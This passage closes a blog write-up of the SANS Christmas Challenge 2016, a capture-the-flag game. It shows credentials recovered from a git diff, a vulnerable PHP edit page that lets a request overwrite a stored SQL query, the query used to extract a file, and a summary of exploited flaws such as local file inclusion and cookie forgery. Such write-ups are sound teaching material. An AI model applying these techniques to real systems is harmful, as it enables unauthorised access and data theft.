commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me &lt;me&#64;example.org&gt;
Date:   Mon Nov 21 21:15:08 2016 -0800

    Fix database dump
</pre>
<p>Let's see the different modifications made on <code>sprusage.sql</code>:</p>
<div class="highlight"><pre><span class="nv">$ </span>git log -p -- ./sprusage.sql
<span class="o">[</span>...<span class="o">]</span>
commit 62547860f9a6e0f3a3bdfd3f9b14fea3ac7f7c31
Author: me &lt;me@example.org&gt;
Date:   Mon Nov <span class="m">21</span> 21:15:08 <span class="m">2016</span> -0800

    Fix database dump

diff --git a/sprusage.sql b/sprusage.sql
index a382229..b948dd0 100644
--- a/sprusage.sql
+++ b/sprusage.sql
<span class="o">[</span>...<span class="o">]</span>
 LOCK TABLES <span class="sb">`</span>users<span class="sb">`</span> WRITE<span class="p">;</span>
 /*!40000 ALTER TABLE <span class="sb">`</span>users<span class="sb">`</span> DISABLE KEYS */<span class="p">;</span>
<span class="hll">-INSERT INTO <span class="sb">`</span>users<span class="sb">`</span> VALUES <span class="o">(</span>0,<span class="s1">&#39;administrator&#39;</span>,<span class="s1">&#39;KeepWatchingTheSkies&#39;</span><span class="o">)</span>,<span class="o">(</span>1,<span class="s1">&#39;guest&#39;</span>,<span class="s1">&#39;busyllama67&#39;</span><span class="o">)</span><span class="p">;</span>
</span> /*!40000 ALTER TABLE <span class="sb">`</span>users<span class="sb">`</span> ENABLE KEYS */<span class="p">;</span>
 UNLOCK TABLES<span class="p">;</span>
 /*!40103 SET <span class="nv">TIME_ZONE</span><span class="o">=</span>@OLD_TIME_ZONE */<span class="p">;</span>
</pre></div>
<p>We can see that <code>administrator</code>'s password is
<code>KeepWatchingTheSkies</code>. With these credentials, we have another method
of authenticating as <code>administrator</code>.</p>
<p>Anyway, we now have access to the <code>edit.php</code> page. This means that we can
edit past saved queries. However, we can only modify the name or the
description of the query, as shown on the screenshot above. Let's see this
functionality in action:</p>
<img alt="analytics_edit_first_use.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_first_use.png" />
<p>Hmm, we can see that the page checks for the presence of some parameters:
<code>name</code>, <code>description</code>... and <code>query</code>! Let's take a look at
the <code>edit.php</code> file:</p>
<div class="highlight"><pre><span class="cp">&lt;?php</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="s2">&quot;SELECT * FROM `reports` WHERE `id`=&#39;&quot;</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39; LIMIT 0, 1&quot;</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">reply</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="s2">&quot;MySQL Error: &quot;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$db</span><span class="p">));</span>
      <span class="k">die</span><span class="p">();</span>
    <span class="p">}</span>
<span class="hll">    <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span>
    <span class="c1"># Update the row with the new values</span>
    <span class="nv">$set</span> <span class="o">=</span> <span class="p">[];</span>
<span class="hll">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class="hll">      <span class="k">print</span> <span class="s2">&quot;Checking for &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;...&lt;br&gt;&quot;</span><span class="p">;</span>
</span>      <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s1">&#39;Yup!&lt;br&gt;&#39;</span><span class="p">;</span>
        <span class="nv">$set</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`</span><span class="si">$name</span><span class="s2">`=&#39;&quot;</span> <span class="o">.</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$name</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</pre></div>
<p>We can see that the <code>edit.php</code> page checks for the presence of every
columns of the <code>reports</code> table in the <code>GET</code> parameters. This means
that if we specify a <code>query</code> <code>GET</code> parameter, we can modify the
stored SQL query of a specific request!</p>
<p>By looking the SQL schema file, <code>sprusage.sql</code>, we can see the format
of the <code>audio</code> table, containing the coveted audio file. We can now
create our fake query:</p>
<div class="highlight"><pre><span class="k">SELECT</span> <span class="n">filename</span><span class="p">,</span><span class="n">HEX</span><span class="p">(</span><span class="n">mp3</span><span class="p">)</span> <span class="k">FROM</span> <span class="n">audio</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;administrator&#39;</span>
</pre></div>
<p>We can now store our malevolent query, and execute it:</p>
<img alt="analytics_edit_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit.png" />
<img alt="analytics_edit_exploit_result.png" class="align-center" src="/images/sans-christmas-challenge-2016/analytics_edit_exploit_result.png" />
<p>We can now recover our hex-encoded audio file, decode it, and get the last
audio file, <code>discombobulatedaudio7.mp3</code>.</p>
</div>
</div>
<div class="section" id="part-5-discombobulated-audio">
<h2>Part 5: Discombobulated Audio</h2>
<p>Now that we've hacked the SantaGram infrastructure, we have our weird audio
files. You can download them here:</p>
<ul class="simple">
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio1.mp3">discombobulatedaudio1.mp3</a> (sha256: <code>8e759e28702e15720ff357694b1f8c9062680da933df5c9bdd16897bfcd00f01</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio2.mp3">discombobulatedaudio2.mp3</a> (sha256: <code>e0050656c5262116f82cbe82c85d0b91f9003f22568bee7f4ce7987744c34f99</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio3.mp3">discombobulatedaudio3.mp3</a> (sha256: <code>7c4a50771764b97227d27aa9dd0a99f396982882111a4924c0b51ee625251ac7</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/debug-20161224235959-0.mp3">debug-20161224235959-0.mp3</a> (sha256: <code>35f5578bc12f096f4072e1dde2688b15145ba59bc48e9cb405576247c7e5a8bb</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio5.mp3">discombobulatedaudio5.mp3</a> (sha256: <code>c088b01e3accc21eda910f25755ebe2ccda3959e4810ce76cdd8cde8ff07651e</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulated-audio-6-XyzE3N9YqKNH.mp3">discombobulated-audio-6-XyzE3N9YqKNH.mp3</a> (sha256: <code>776b26a58310d9ad80ab7b5c80fe4a5e03ed86210d9e28906fb93e30004ef35a</code>)</li>
<li><a class="reference external" href="/docs/sans-christmas-challenge-2016/discombobulatedaudio7.mp3">discombobulatedaudio7.mp3</a> (sha256: <code>60259f117d76535518dc2b3f01ae314f0969d61ae7066e75af708be7b059f214</code>)</li>
</ul>
<p>At first, I suspected that, since all the files are approximately the same
length, you had to superimpose every one of them, or something, which led
to this horrendous result:</p>
<audio src="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg" controls></audio><p>You can download the audio file <a class="reference external" href="/docs/sans-christmas-challenge-2016/horrendous_audio_file.ogg">here</a> (sha256: <code>c195d43e6445c84686a1bd4e89429db0f2802e8d8ae31e93769490d1204e098c</code>)</p>
<p>The solution is actually quite simpler. You just have to put the audio files
in the order we found them, then change the tempo of the audio track, to get
something intelligible:</p>
<audio src="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg" controls></audio><p>You can download the audio file <a class="reference external" href="/docs/sans-christmas-challenge-2016/de_discombobulated_audio.ogg">here</a> (sha256: <code>20e91d466c4cea4e1282e32dfc52725eadff05276d91bcc9fbd547c09bf2964a</code>)</p>
<p>If you can't quite hear the spoken phrase, it's:</p>
<blockquote>
Father Christmas, Santa Claus or, as I've always known him, Jeff.</blockquote>
<p>Now, I didn't recognize the reference right away, but if you
<a class="reference external" href="https://duckduckgo.com/?q=%22Father+Christmas%2C+Santa+Claus+or%2C+as+I%27ve+always+known+him%2C+Jeff.%22&amp;ia=web">DuckDuckgo the sentence</a>
(or part of it if you only got some audio files), you find that it's from a
Doctor Who Christmas Special, <a class="reference external" href="http://www.imdb.com/title/tt1672218/">A Christmas Carol</a>.
Now, I DID see this Doctor Who, but failed to remember the reference, so I'm
still ashamed of this.</p>
<p>Anyway, if you remember, there was still one door in the North Pole we couldn't
open: the door in the Corridor. Since the audio pointed to Doctor Who, I tried
every element of the show I could think of (&quot;The Doctor&quot;, &quot;Amy Pond&quot;, &quot;The
Master&quot;, &quot;Tardis&quot;, &quot;tardis&quot;, &quot;TARDIS&quot;, &quot;Geronimo&quot;, &quot;Geronimo!&quot;, &quot;Geronimo!!!&quot;,
...). Turns out, the passphrase to the door was just the full sentence we
hear in the audio file. Trying too hard leads nowhere.</p>
<p>Now that we've opened the door, we can see Who is behind this nefarious plot
(see what I did there?).</p>
<img alt="the_doctor.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_doctor.png" />
<p>It was the Doctor all along! If we talk to him, he explains his plan:</p>
<blockquote>
The question of the hour is this: Who nabbed Santa. The answer? Yes,
I did. Next question: Why would anyone in his right mind kidnap Santa
Claus? The answer: Do I look like I'm in my right mind? I'm a madman
with a box. I have looked into the time vortex and I have seen a
universe in which the Star Wars Holiday Special was NEVER released.
In that universe, 1978 came and went as normal. No one had to endure
the misery of watching that abominable blight. People were happy
there. It's a better life, I tell you, a better world than the
scarred one we endure here. Give me a world like that. Just once. So
I did what I had to do. I knew that Santa's powerful North Pole
Wonderland Magick could prevent the Star Wars Special from being
released, if I could leverage that magick with my own abilities back
in 1978. But Jeff refused to come with me, insisting on the mad idea
that it is better to maintain the integrity of the universe’s
timeline. So I had no choice – I had to kidnap him. It was sort
of one of those days. Well. You know what I mean. Anyway... Since you
interfered with my plan, we'll have to live with the Star Wars
Holiday Special in this universe... FOREVER.  If we attempt to go
back again, to cross our own timeline, we'll cause a temporal
paradox, a wound in time. We'll never be rid of it now. The Star Wars
Holiday Special will plague this world until time itself ends... All
because you foiled my brilliant plan.  Nice work.</blockquote>
<p>Now, although I'm a major Star Wars fan, I've always decided to listen to the
advice of my elders regarding the <a class="reference external" href="https://en.wikipedia.org/wiki/Star_Wars_Holiday_Special">Christmas Special</a>
(shout out to <a class="reference external" href="https://xkcd.com/653/">Randal Munroe</a>), and I've never
watched it. Guess I'll continue to refrain from watching it. Brrrr...</p>
</div>
<div class="section" id="epilogue-bringing-it-all-home">
<h2>Epilogue: Bringing It All Home</h2>
<p>As the title suggests, it's time to bring it home, and answer each question of
the challenge:</p>
<ol class="arabic simple">
<li><cite>What is the secret message in Santa's tweets?</cite></li>
</ol>
<p>The secret message in Santa's tweets is <code>bugbounty</code>.</p>
<ol class="arabic simple" start="2">
<li><cite>What is inside the ZIP file distributed by Santa's team?</cite></li>
</ol>
<p>Inside the ZIP file distributed by Santa's team, there is a copy of the Android
application for their bug bounty, SantaGram_4.2.apk.</p>
<ol class="arabic simple" start="3">
<li><cite>What username and password are embedded in the APK file?</cite></li>
</ol>
<p>The credentials in the APK file are <code>guest/busyreindeer78</code>.</p>
<ol class="arabic simple" start="4">
<li><cite>What is the name of the audible component (audio file. in the SantaGram APK
file?</cite></li>
</ol>
<p>The name of the audio file in the SantaGram APK file is
<code>discombobulatedaudio1.mp3</code>.</p>
<ol class="arabic simple" start="5">
<li><cite>What is the password for the &quot;cranpi&quot; account on the Cranberry Pi system?</cite></li>
</ol>
<p>The password of the &quot;cranpi&quot; account is <code>yummycookies</code>.</p>
<ol class="arabic simple" start="6">
<li><cite>How did you open each terminal door and where had the villain imprisoned
Santa?</cite></li>
</ol>
<ul class="simple">
<li><strong>Elf House #2</strong>: using <code>sudo</code> to execute commands as <code>itchy</code>, we
can read the PCAP file, containing the two halves of the passphrase, one
encoded in plain 7-bit ASCII, one encoded in 16-bit big endian.</li>
<li><strong>Workshop, first door</strong>: using <code>find</code>, we can find the file containing
the passphrase, and print its content.</li>
<li><strong>Santa's office</strong>: using our <cite>*cough cough*</cite> knowledge of the film WarGames,
we can get the correct passphrase.</li>
<li><strong>Workshop, second door</strong>: by analyzing the <code>wumpus</code> program, we can
find the function in charge of computing the passphrase, and directly call
it.</li>
<li><strong>Train station</strong>: since the <code>HELP</code> function uses <code>less</code> to print
the content of the help file, we can use <code>less</code>'s features to open
other files, including the one containing the passphrase.</li>
</ul>
<p>The villain had imprisoned Santa Claus in the DFER room, <strong>in 1978</strong>.</p>
<ol class="arabic simple" start="7">
<li><cite>For each of those six items, which vulnerabilities did you discover and
exploit?</cite></li>
</ol>
<ul>
<li><dl class="first docutils">
<dt><strong>The Mobile Analytics Server (via credentialed login access)</strong>:</dt>
<dd><ul class="first last simple">
<li>Credentials stored in plaintext in the SantaGram APK.</li>
<li>Use of these credentials on the analytics server.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><strong>The Dungeon Game</strong></dt>
<dd><ul class="first last simple">
<li>Finding of the Dungeon CLI with <code>nmap</code>.</li>
<li>Using our <cite>*cough cough*</cite> knowledge of the video game Zork to get the
email address of Peppermint.</li>
<li>Sending an email to Peppermint to receive the audio file.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><strong>The Debug Server</strong>:</dt>
<dd><ul class="first last simple">
<li>Patching of the SantaGram APK to enable debug data.</li>
<li>JSON request tampering to increase verbosity of the debug server.</li>
<li>Disclosing of the path of the audio file in the response of the debug
server.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><strong>The Banner Ad Server</strong>:</dt>
<dd><ul class="first last simple">
<li>Using Meteor Miner, we could list the different routes.</li>
<li>Disclosing of the <code>/admin/quotes</code> route.</li>
<li>Using Meteor Miner, we could list the collection of quotes.</li>
<li>Disclosing of the path of the audio file in the attributes of one of the
quotes.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><strong>The Uncaught Exception Handler Server</strong>:</dt>
<dd><ul class="first last simple">
<li>Verbose error allowing to build a correct <code>ReadCrashDump</code> request.</li>
<li>Local File Inclusion in the <code>exception.php</code> page.</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt><strong>The Mobile Analytics Server (post authentication)</strong>:</dt>
<dd><ul class="first last simple">
<li>Source files recovery with open Git repository.</li>
<li>Creation of an administrator cookie.</li>
<li>Exploitation of the <code>edit.php</code> page to store an arbitrary SQL
query.</li>
</ul>
</dd>
</dl>
</li>
</ul>
<ol class="arabic simple" start="8">
<li><cite>What are the names of the audio files you discovered from each system above?</cite></li>
</ol>
<ul class="simple">
<li><strong>The Mobile Analytics Server (via credentialed login access)</strong>: <code>discombobulatedaudio2.mp3</code></li>
<li><strong>The Dungeon Game</strong>: <code>discombobulatedaudio3.mp3</code></li>
<li><strong>The Debug Server</strong>: <code>debug-20161224235959-0.mp3</code></li>
<li><strong>The Banner Ad Server</strong>: <code>discombobulatedaudio5.mp3</code></li>
<li><strong>The Uncaught Exception Handler Server</strong>: <code>discombobulated-audio-6-XyzE3N9YqKNH.mp3</code></li>
<li><strong>The Mobile Analytics Server (post authentication)</strong>: <code>discombobulatedaudio7.mp3</code></li>
</ul>
<ol class="arabic simple" start="9">
<li><cite>Who is the villain behind the nefarious plot?</cite></li>
</ol>
<p>The villain behind the nefarious plot is the Doctor.</p>
<ol class="arabic simple" start="10">
<li><cite>Why had the villain abducted Santa?</cite></li>
</ol>
<p>The Doctor had abducted Santa to use his magick to prevent the Star Wars
Christmas special from ever coming out.</p>
</div>
<div class="section" id="conclusion">
<h2>Conclusion</h2>
<p>Once again, a great challenge by the SANS, which I managed, this time, to
finish completely! I also noticed that I didn't improve my skills in reverse
engineering and binary analysis, which is a skill I wanted to improve, as said
in last year's write-up. Bad me...</p>
<p>Anyway, see you next year for the next SANS Christmas Challenge ;) !</p>
</div>

  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>
</article>

    <footer>
<p>
  &copy; Yannick Méheut 2017 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by-sa/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "name": "SANS Christmas Challenge 2016",
  "headline": "SANS Christmas Challenge 2016",
  "datePublished": "2017-01-05 00:00:00+01:00",
  "dateModified": "",
  "author": {
    "@type": "Person",
    "name": "useless",
    "url": "../../../../../author/useless.html"
  },
  "image": "/images/useless_profile_pic.jpg",
  "url": "../../../../../posts/2017/01/05/sans-christmas-challenge-2016/",
  "description": "This blog is beginning to look a lot like being exclusively about SANS Christmas Challenges write-ups. What can I say, they're so good! Anyway, let's roll for the 2016 edition of this marvelous Christmas Challenge. Everything starts again with the Dosis children. As they're reminiscing on last ..."
}
</script></body>
</html>